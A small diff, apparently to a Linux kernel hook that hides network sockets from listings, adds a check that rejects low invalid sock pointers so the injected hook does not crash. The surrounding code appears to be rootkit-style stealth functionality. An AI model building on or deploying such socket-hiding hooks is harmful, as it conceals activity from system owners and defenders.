@@ -44,6 +44,12 @@ static bool should_hide_sock(struct sock *sk)
     if (!sk)
         return false;
 
+    /* 防御：拒绝明显非法的 sock 指针（如 seq_file 的 SEQ_START_TOKEN 等
+     * magic 值），避免注入点位于 token 检查之前时解引用崩溃。
+     * 用 0x1000 做低地址阈值（arm64 最小页大小 4K），不依赖 PAGE_SIZE 宏。 */
+    if ((unsigned long)sk < 0x1000)
+        return false;
+
     if (caller_should_see_hidden())
         return false;
 
